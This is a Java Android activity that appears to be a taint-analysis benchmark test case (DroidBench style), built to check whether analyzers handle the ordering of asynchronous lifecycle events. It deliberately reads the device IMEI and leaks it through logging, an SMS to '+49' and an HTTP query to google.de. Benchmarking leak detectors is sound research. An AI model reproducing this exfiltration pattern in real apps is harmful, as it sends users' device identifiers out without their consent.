package edu.mit.activity_asynchronous_event_ordering;

import android.app.Activity;
import android.os.Bundle;
import android.os.StrictMode;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

/**
 * @testcase_name Activity-Asynchronous-Event-Ordering
 * 
 * @description Account for the asynchronous event firing of onLowMemory
 * @dataflow source -> sink
 * @number_of_leaks 1
 * @challenges - The analysis must account for all legal ordering of asynch events with respect
 * to the activity life cycle
 */
public class MainActivity extends Activity {
    String imei = "";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        if (android.os.Build.VERSION.SDK_INT > 9) {
            StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
            StrictMode.setThreadPolicy(policy);
        }
    }

    protected void onStop() {
        super.onStop();
	    Log.i("DroidBench", imei); //sink, possible leak
        SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage("+49", null, imei, null, null);  //sink, leak

        try {
            connect(imei);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }	

    protected void onResume() {
        super.onResume();
	TelephonyManager mgr = (TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);
	imei = mgr.getDeviceId();  //source
    }
    
    public void onLowMemory() {
	imei = "";      
    }

    private void connect(String data) throws IOException {
        String URL = "http://www.google.de/search?q=";
        URL = URL.concat(data);
        java.net.URL url = new URL(URL);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection(); //sink, leak
        conn.setRequestMethod("GET");
        conn.setDoInput(true);
        // Starts the query
        conn.connect();
        Log.d(getClass().getSimpleName(), URL);

        InputStream is = conn.getInputStream();
        if (is == null)
            return;
        StringBuilder sb = new StringBuilder();
        BufferedReader br = new BufferedReader(new InputStreamReader(is));
        String line = null;
        try {
            while ((line = br.readLine()) != null)
                sb.append(line);
        } finally {
            br.close();
            is.close();
        }
        Log.d(getClass().getSimpleName(), sb.toString());
    }
}
